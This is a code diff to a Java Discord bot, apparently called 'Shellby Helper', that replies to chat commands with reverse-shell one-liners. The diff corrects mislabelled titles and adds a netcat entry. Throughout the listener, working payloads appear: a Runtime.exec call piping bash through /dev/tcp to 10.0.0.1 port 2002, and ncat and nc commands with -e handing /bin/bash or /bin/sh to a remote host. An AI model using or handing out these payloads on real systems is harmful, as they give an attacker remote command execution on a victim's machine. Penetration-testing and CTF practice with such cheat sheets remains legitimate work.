@@ -82,7 +82,7 @@ public class ComanndShellby_reverseshells implements MessageCreateListener {
         if (sprava_shell.getContent().equalsIgnoreCase("-shh java")) {
             new MessageBuilder()
                     .setEmbed(new EmbedBuilder()
-                            .setTitle("**Ruby Reverse Shell**")
+                            .setTitle("**Java Reverse Shell**")
                             .setDescription("Use this code \n" +
                                     "```r = Runtime.getRuntime()\n" +
                                     "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n" +
@@ -95,10 +95,10 @@ public class ComanndShellby_reverseshells implements MessageCreateListener {
         };
 
 
-        if (sprava_shell.getContent().equalsIgnoreCase("-shh Ncat")) {
+        if (sprava_shell.getContent().equalsIgnoreCase("-shh ncat")) {
             new MessageBuilder()
                     .setEmbed(new EmbedBuilder()
-                            .setTitle("**Ruby Reverse Shell**")
+                            .setTitle("**Ncat Reverse Shell**")
                             .setDescription("Use this code \n" +
                                     "```ncat IP PORT -e /bin/bash\n ```")
                             .setTimestampToNow()
@@ -108,5 +108,17 @@ public class ComanndShellby_reverseshells implements MessageCreateListener {
 
         };
 
+        if (sprava_shell.getContent().equalsIgnoreCase("-shh netcat")) {
+            new MessageBuilder()
+                    .setEmbed(new EmbedBuilder()
+                            .setTitle("**Netcat Reverse Shell**")
+                            .setDescription("Use this code \n" +
+                                    "```nc -e /bin/sh IP PORT\n ``` ")
+                            .setTimestampToNow()
+                            .setFooter("Shellby Helper")
+                            .setColor(new Color(95, 212, 96)))
+                    .send(event.getChannel()).join();
+
+        };
     }
 }
